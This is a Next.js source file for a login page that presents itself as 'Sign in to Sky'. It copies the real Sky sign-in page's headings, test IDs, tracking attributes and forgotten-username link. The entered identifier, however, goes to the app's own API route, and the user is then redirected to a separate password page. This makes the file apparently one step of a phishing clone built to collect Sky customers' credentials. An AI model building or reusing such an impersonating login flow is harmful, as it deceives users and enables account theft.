// src/app/login/page.tsx
'use client';
import React, { useState } from 'react';
import { useRouter } from 'next/navigation';
import ErrorIcon from '../../components/icons/ErrorIcon';


export default function LoginPage() {
  const router = useRouter();
  const [identifier, setIdentifier] = useState('');
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!identifier.trim()) {
      newErrors.email = 'Enter your email address or username.';
    }
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    const newErrors = validate();
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setLoading(true);
    try {
      const res = await fetch('/api/graphql/check-identifier', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ identifier }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        // Save identifier temporarily in session storage
        sessionStorage.setItem('login_identifier', identifier);
        // Redirect to password page
        router.push(`/enter-password`);
      } else {
        setErrors({
          email:
            data.message ||
            "We can't find an account matching that email address or username.",
        });
      }
    } catch (err) {
      console.error(err);
      setErrors({ email: 'Something went wrong. Please try again.' });
    } finally {
      setLoading(false);
    }
  };


  return (
    <div className="page-content">
      <div className="card-container">
        <div className="card">
          <div className="sign-in-outer-grid">
            <h2 className="page-heading" data-testid="IDENTIFIER_PAGE_HEADING">
              Hello
            </h2>
            <h3
              data-testid="IDENTIFIER_PAGE_SUB_HEADING"
              aria-hidden="true"
              className="body text dark"
            >
              Sign in to Sky
            </h3>
            <div className="form-wrapper" id="identifierFormWrapper">
              <form className="form-input-and-control-grid" onSubmit={handleSubmit} noValidate>
                <div className="text-input-container type-text label-in-border">
                  <div className="input-wrapper">
                    <input
                      autoComplete="username"
                      autoCapitalize="off"
                      className={`input touched ${errors.email ? 'input-error' : ''}`}
                      data-testid="IDENTIFIER_INPUT"
                      id="identifier"
                      maxLength={256}
                      name="identifier"
                      required
                      type="text"
                      value={identifier}
                      onChange={(e) => {
                        setIdentifier(e.target.value);
                        if (errors.email) setErrors({});
                      }}
                      placeholder=" "
                      disabled={loading}
                    />
                    <span className="pseudo-focus"></span>
                    <p aria-hidden="true" className="displayed-input-label">
                      Email or username
                    </p>
                  </div>
                  {errors.email && (
                    <div className="error-message-container">
                      <ErrorIcon />
                      <p
                        id="identifierAriaErrorText"
                        data-testid="IDENTIFIER_INPUT_ERROR"
                        className="body-sm text ta-left error-message negative-regular"
                      >
                        {errors.email}
                      </p>
                    </div>
                  )}
                </div>
                <div className="identifier-links-and-button-grid">
                  <span className="link-container inline">
                    <a
                      data-testid="IDENTIFIER_FORGOTTEN_USERNAME_LINK"
                      id="forgotUsernameLink"
                      data-tracking-description="cta:IDENTIFIER_FORGOTTEN_USERNAME_LINK"
                      data-tracking-location="Page"
                      data-tracking-text="Forgotten your email or username?"
                      href="https://skyid.sky.com/forgotusername/skycom/7b2261223a2268747470733a2f2f69642e736b792e636f6d2f222c2262223a2268747470733a2f2f69642e736b792e636f6d2f227d"
                      className="link body dark inactive"
                    >
                      Forgotten your email or username?
                    </a>
                    <span className="pseudo-focus"></span>
                  </span>
                  <button
                    className="btn primary full-width"
                    data-testid="IDENTIFIER_SUBMIT"
                    type="submit"
                    data-tracking-description="cta:IDENTIFIER_SUBMIT"
                    data-tracking-location="Page"
                    data-tracking-text="Continue"
                  >
                    {loading ? 'Checking...' : 'Continue'}
                  </button>
                  <span className="link-container inline">
                    <a
                      data-testid="IDENTIFIER_CREATE_ACCOUNT_LINK"
                      data-tracking-description="cta:IDENTIFIER_CREATE_ACCOUNT_LINK"
                      data-tracking-location="Page"
                      data-tracking-text="Create a new account"
                      href="/signup"
                      className="link body dark inactive"
                    >
                      Create a new account
                    </a>
                    <span className="pseudo-focus"></span>
                  </span>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
